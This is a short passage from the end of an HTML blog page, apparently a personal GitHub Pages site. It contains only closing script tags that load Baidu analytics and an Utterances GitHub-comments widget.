  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>